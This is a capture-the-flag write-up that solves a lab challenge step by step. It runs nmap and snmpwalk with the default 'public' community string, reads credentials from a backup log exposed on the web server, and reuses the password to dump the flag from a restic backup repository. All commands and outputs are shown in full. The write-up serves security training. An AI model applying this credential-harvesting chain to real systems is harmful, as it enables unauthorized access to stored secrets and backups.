# Admin Johnson (3 points)

Hi, TCC-CSIRT analyst,

admin Johnson began testing backup procedures on server
`johnson-backup.cypherfix`.tcc, but left the process incomplete due to other
interesting tasks. Your task is to determine whether the current state is
exploitable.

See you in the next incident!

## Hints

* Admin Johnson is not strong on maintaining password hygiene.

## Solution

To start with, let's use `nmap` to see what is listening on the server.

```console
$ nmap -p - johnson-backup.cypherfix.tcc -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 17:37 CEST
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for johnson-backup.cypherfix.tcc (10.99.24.30)
Host is up (0.025s latency).
Not shown: 65533 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.61 ((Debian))
199/tcp open  smux    Linux SNMP multiplexer
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

As the SNMP port is open, we can use `snmpwalk` to explore further.

```console
$ snmpwalk -v1 -cpublic johnson-backup.cypherfix.tcc
iso.3.6.1.2.1.25.4.2.1.1.1 = INTEGER: 1
iso.3.6.1.2.1.25.4.2.1.1.7 = INTEGER: 7
iso.3.6.1.2.1.25.4.2.1.1.8 = INTEGER: 8
iso.3.6.1.2.1.25.4.2.1.1.9 = INTEGER: 9
iso.3.6.1.2.1.25.4.2.1.1.12 = INTEGER: 12
iso.3.6.1.2.1.25.4.2.1.1.16 = INTEGER: 16
iso.3.6.1.2.1.25.4.2.1.1.20 = INTEGER: 20
iso.3.6.1.2.1.25.4.2.1.1.28 = INTEGER: 28
iso.3.6.1.2.1.25.4.2.1.1.38 = INTEGER: 38
iso.3.6.1.2.1.25.4.2.1.1.39 = INTEGER: 39
iso.3.6.1.2.1.25.4.2.1.1.8958 = INTEGER: 8958
iso.3.6.1.2.1.25.4.2.1.2.1 = STRING: "supervisord"
iso.3.6.1.2.1.25.4.2.1.2.7 = STRING: "apache2ctl"
iso.3.6.1.2.1.25.4.2.1.2.8 = STRING: "cron"
iso.3.6.1.2.1.25.4.2.1.2.9 = STRING: "snmpd"
iso.3.6.1.2.1.25.4.2.1.2.12 = STRING: "cron"
iso.3.6.1.2.1.25.4.2.1.2.16 = STRING: "sh"
iso.3.6.1.2.1.25.4.2.1.2.20 = STRING: "restic.sh"
iso.3.6.1.2.1.25.4.2.1.2.28 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.38 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.39 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8958 = STRING: "sleep"
iso.3.6.1.2.1.25.4.2.1.3.1 = OID: ccitt.0
iso.3.6.1.2.1.25.4.2.1.3.7 = OID: ccitt.0
iso.3.6.1.2.1.25.4.2.1.3.8 = OID: ccitt.0
iso.3.6.1.2.1.25.4.2.1.3.9 = OID: ccitt.0
iso.3.6.1.2.1.25.4.2.1.3.12 = OID: ccitt.0
iso.3.6.1.2.1.25.4.2.1.3.16 = OID: ccitt.0
iso.3.6.1.2.1.25.4.2.1.3.20 = OID: ccitt.0
iso.3.6.1.2.1.25.4.2.1.3.28 = OID: ccitt.0
iso.3.6.1.2.1.25.4.2.1.3.38 = OID: ccitt.0
iso.3.6.1.2.1.25.4.2.1.3.39 = OID: ccitt.0
iso.3.6.1.2.1.25.4.2.1.3.8958 = OID: ccitt.0
iso.3.6.1.2.1.25.4.2.1.4.1 = STRING: "/usr/bin/python3"
iso.3.6.1.2.1.25.4.2.1.4.7 = STRING: "/bin/sh"
iso.3.6.1.2.1.25.4.2.1.4.8 = STRING: "/usr/sbin/cron"
iso.3.6.1.2.1.25.4.2.1.4.9 = STRING: "/usr/sbin/snmpd"
iso.3.6.1.2.1.25.4.2.1.4.12 = STRING: "/usr/sbin/CRON"
iso.3.6.1.2.1.25.4.2.1.4.16 = STRING: "/bin/sh"
iso.3.6.1.2.1.25.4.2.1.4.20 = STRING: "/bin/bash"
iso.3.6.1.2.1.25.4.2.1.4.28 = STRING: "/usr/sbin/apache2"
iso.3.6.1.2.1.25.4.2.1.4.38 = STRING: "/usr/sbin/apache2"
iso.3.6.1.2.1.25.4.2.1.4.39 = STRING: "/usr/sbin/apache2"
iso.3.6.1.2.1.25.4.2.1.4.8958 = STRING: "sleep"
iso.3.6.1.2.1.25.4.2.1.5.1 = STRING: "/usr/bin/supervisord"
iso.3.6.1.2.1.25.4.2.1.5.7 = STRING: "/usr/sbin/apache2ctl -D FOREGROUND"
iso.3.6.1.2.1.25.4.2.1.5.8 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.9 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.12 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.16 = STRING: "-c /etc/scripts/restic.sh >> /var/www/html/3cde480a8572719b9b33acb1257c6361/restic.err.log 2>&1"
iso.3.6.1.2.1.25.4.2.1.5.20 = STRING: "/etc/scripts/restic.sh"
iso.3.6.1.2.1.25.4.2.1.5.28 = STRING: "-D FOREGROUND"
iso.3.6.1.2.1.25.4.2.1.5.38 = STRING: "-D FOREGROUND"
iso.3.6.1.2.1.25.4.2.1.5.39 = STRING: "-D FOREGROUND"
iso.3.6.1.2.1.25.4.2.1.5.8958 = STRING: "86400"
iso.3.6.1.2.1.25.4.2.1.6.1 = INTEGER: 4
iso.3.6.1.2.1.25.4.2.1.6.7 = INTEGER: 4
iso.3.6.1.2.1.25.4.2.1.6.8 = INTEGER: 4
iso.3.6.1.2.1.25.4.2.1.6.9 = INTEGER: 4
iso.3.6.1.2.1.25.4.2.1.6.12 = INTEGER: 4
iso.3.6.1.2.1.25.4.2.1.6.16 = INTEGER: 4
iso.3.6.1.2.1.25.4.2.1.6.20 = INTEGER: 4
iso.3.6.1.2.1.25.4.2.1.6.28 = INTEGER: 4
iso.3.6.1.2.1.25.4.2.1.6.38 = INTEGER: 4
iso.3.6.1.2.1.25.4.2.1.6.39 = INTEGER: 4
iso.3.6.1.2.1.25.4.2.1.6.8958 = INTEGER: 4
iso.3.6.1.2.1.25.4.2.1.7.1 = INTEGER: 2
iso.3.6.1.2.1.25.4.2.1.7.7 = INTEGER: 2
iso.3.6.1.2.1.25.4.2.1.7.8 = INTEGER: 2
iso.3.6.1.2.1.25.4.2.1.7.9 = INTEGER: 1
iso.3.6.1.2.1.25.4.2.1.7.12 = INTEGER: 2
iso.3.6.1.2.1.25.4.2.1.7.16 = INTEGER: 2
iso.3.6.1.2.1.25.4.2.1.7.20 = INTEGER: 2
iso.3.6.1.2.1.25.4.2.1.7.28 = INTEGER: 2
iso.3.6.1.2.1.25.4.2.1.7.38 = INTEGER: 2
iso.3.6.1.2.1.25.4.2.1.7.39 = INTEGER: 2
iso.3.6.1.2.1.25.4.2.1.7.8958 = INTEGER: 2
End of MIB
```

We can see restic backup script being executed and storing its output to
`/var/www/html/3cde480a8572719b9b33acb1257c6361/restic.err.log`, i.e. to
the directory mapped to a web server. Let's retrieve those logs.

```console
$ curl http://johnson-backup.cypherfix.tcc/3cde480a8572719b9b33acb1257c6361/restic.err.log
restic -r rest:http://johnson:KGDkjgsdsdg883hhd@restic-server.cypherfix.tcc:8000/test check
using temporary cache in /tmp/restic-check-cache-1940938965
create exclusive lock for repository
Save(<lock/340d752ce5>) returned error, retrying after 552.330144ms: server response unexpected: 500 Internal Server Error (500)
Save(<lock/340d752ce5>) returned error, retrying after 1.080381816s: server response unexpected: 500 Internal Server Error (500)
Save(<lock/340d752ce5>) returned error, retrying after 1.31013006s: server response unexpected: 500 Internal Server Error (500)
Save(<lock/340d752ce5>) returned error, retrying after 1.582392691s: server response unexpected: 500 Internal Server Error (500)
Save(<lock/340d752ce5>) returned error, retrying after 2.340488664s: server response unexpected: 500 Internal Server Error (500)
Save(<lock/340d752ce5>) returned error, retrying after 4.506218855s: server response unexpected: 500 Internal Server Error (500)
Save(<lock/340d752ce5>) returned error, retrying after 3.221479586s: server response unexpected: 500 Internal Server Error (500)
Save(<lock/340d752ce5>) returned error, retrying after 5.608623477s: server response unexpected: 500 Internal Server Error (500)
Save(<lock/340d752ce5>) returned error, retrying after 7.649837917s: server response unexpected: 500 Internal Server Error (500)
Save(<lock/340d752ce5>) returned error, retrying after 15.394871241s: server response unexpected: 500 Internal Server Error (500)
server response unexpected: 500 Internal Server Error (500)
github.com/restic/restic/internal/backend/rest.(*Backend).Save
        github.com/restic/restic/internal/backend/rest/rest.go:167
github.com/restic/restic/internal/backend.(*RetryBackend).Save.func1
        github.com/restic/restic/internal/backend/backend_retry.go:66
github.com/cenkalti/backoff.RetryNotifyWithTimer
        github.com/cenkalti/backoff/retry.go:55
github.com/cenkalti/backoff.RetryNotify
        github.com/cenkalti/backoff/retry.go:34
github.com/restic/restic/internal/backend.(*RetryBackend).retry
        github.com/restic/restic/internal/backend/backend_retry.go:46
github.com/restic/restic/internal/backend.(*RetryBackend).Save
        github.com/restic/restic/internal/backend/backend_retry.go:60
github.com/restic/restic/internal/cache.(*Backend).Save
        github.com/restic/restic/internal/cache/backend.go:59
github.com/restic/restic/internal/repository.(*Repository).SaveUnpacked
        github.com/restic/restic/internal/repository/repository.go:488
github.com/restic/restic/internal/restic.SaveJSONUnpacked
        github.com/restic/restic/internal/restic/json.go:31
github.com/restic/restic/internal/restic.(*Lock).createLock
        github.com/restic/restic/internal/restic/lock.go:161
github.com/restic/restic/internal/restic.newLock
        github.com/restic/restic/internal/restic/lock.go:105
github.com/restic/restic/internal/restic.NewExclusiveLock
        github.com/restic/restic/internal/restic/lock.go:73
main.lockRepository
        github.com/restic/restic/cmd/restic/lock.go:42
main.lockRepoExclusive
        github.com/restic/restic/cmd/restic/lock.go:27
main.runCheck
        github.com/restic/restic/cmd/restic/cmd_check.go:212
main.glob..func5
        github.com/restic/restic/cmd/restic/cmd_check.go:37
github.com/spf13/cobra.(*Command).execute
        github.com/spf13/cobra/command.go:916
github.com/spf13/cobra.(*Command).ExecuteC
        github.com/spf13/cobra/command.go:1044
github.com/spf13/cobra.(*Command).Execute
        github.com/spf13/cobra/command.go:968
main.main
        github.com/restic/restic/cmd/restic/main.go:98
runtime.main
        runtime/proc.go:250
runtime.goexit
        runtime/asm_amd64.s:1594
unable to create lock in backend
```

The logs reveal that the username `johnson` and the password
`KGDkjgsdsdg883hhd` is being used to log in to
`restic-server.cypherfix.tcc:8000`.

The logs also indicate, that there's an error when creating an exclusive lock
for the repository, so if we try to retrieve the backup using the same command,
we'll face the same issue. However, restic client allows us to execute
operations also without the locks (`--no-lock` option), so we can try to list
the repository content.

In addition to that, we'll be prompted for the password for repository, but
since the hint indicates that the password hygiene is not strong, we can try to
use the same password as for REST API, only to find out that it works. For
easier manipulation (i.e. so that we don't need to re-type it every time), we
can store it in `restic_pass.txt`.

After these 2 steps, we can see the list of available files.

```console
$ restic -r rest:http://johnson:KGDkjgsdsdg883hhd@restic-server.cypherfix.tcc:8000/test --no-lock -p restic_pass.txt ls latest
repository 4c59d415 opened (version 2, compression level auto)
[0:00] 100.00%  1 / 1 index files loaded
snapshot 84e8d815 of [/etc/secret] at 2024-08-08 08:58:38.365981379 +0000 UTC by root@4d6c9220e986 filtered by []:
/etc
/etc/secret
/etc/secret/flag
```

The result shows us that the flag is hidden in `etc/secret/flag` file, which we
can now easily retrieve.

```console
$ restic -r rest:http://johnson:KGDkjgsdsdg883hhd@restic-server.cypherfix.tcc:8000/test --no-lock -p restic_pass.txt dump latest /etc/secret/flag
repository 4c59d415 opened (version 2, compression level auto)
[0:00] 100.00%  1 / 1 index files loaded
FLAG{OItn-zKZW-cht7-RNH4}
```
